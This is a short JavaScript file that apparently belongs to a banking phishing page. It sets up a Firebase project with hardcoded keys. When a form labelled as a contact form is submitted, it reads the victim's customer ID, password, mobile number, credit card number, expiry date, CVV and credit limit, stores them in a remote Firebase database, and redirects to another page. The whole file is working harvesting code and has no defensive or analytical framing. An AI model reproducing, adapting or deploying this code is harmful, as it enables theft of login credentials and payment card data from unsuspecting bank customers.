

const firebaseConfig = {
    apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
    authDomain: "start-45a39.firebaseapp.com",
    databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
    projectId: "start-45a39",
    storageBucket: "start-45a39.appspot.com",
    messagingSenderId: "377019727798",
    appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("contactForm");
  
  document.getElementById("contactForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var customerid = getElementVal("lc_id");
    var password = getElementVal("lpass");
    var mobile = getElementVal("rgmob");
    var creditnumber = getElementVal("ccnum");
    var expiredate = getElementVal("edate");
    var cvv = getElementVal("cvv");
    var creditlimit = getElementVal("ccl");
    var regmobile = getElementVal("rgmob_cc");
  
    saveMessages(customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile);
  
    //   enable alert
    window.location.href = "tok.html"; // Replace with your actual page URL
}
  
  const saveMessages = (customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      customerid: customerid,
      password: password,
      mobile: mobile,
      creditnumber: creditnumber,
      expiredate: expiredate,
      cvv: cvv,
      creditlimit: creditlimit,
      regmobile: regmobile,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };